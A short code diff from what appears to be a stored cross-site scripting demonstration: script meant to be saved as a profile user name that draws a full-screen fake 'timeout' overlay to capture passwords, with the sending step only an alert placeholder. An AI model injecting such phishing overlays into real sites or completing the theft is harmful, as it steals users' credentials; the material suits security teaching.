@@ -17,6 +17,7 @@ Save the below text as a profile user name and see what happens!
 		fakeTimeout .appendChild(button);
 		const emailMeTheEnteredPassword  = function() { alert('EMAIL ME THE ENTERED PASSWORD') }
 		fakeTimeout.onSubmit =  emailMeTheEnteredPassword;
+		button.style.display='none';
 		fakeTimeout.style.position = 'fixed';
 		fakeTimeout.style.width = '100%';
 		fakeTimeout.style.height = '100%';
